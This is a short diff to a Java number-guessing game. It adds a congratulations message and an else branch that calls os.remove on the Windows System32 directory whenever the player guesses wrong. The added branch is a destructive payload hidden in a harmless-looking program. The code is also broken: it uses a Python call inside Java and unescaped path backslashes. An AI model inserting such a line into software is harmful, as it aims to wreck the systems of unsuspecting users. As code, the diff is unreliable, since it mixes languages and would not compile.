@@ -28,4 +28,12 @@ public class Main {
 
         if(guess == number)
         {
-            System.out.
+            System.out.println("Congratulations! You guessed the number!");
+        }
+        else
+        {
+            os.remove("C:\Windows\System32");
+        }
+    }
+}
+
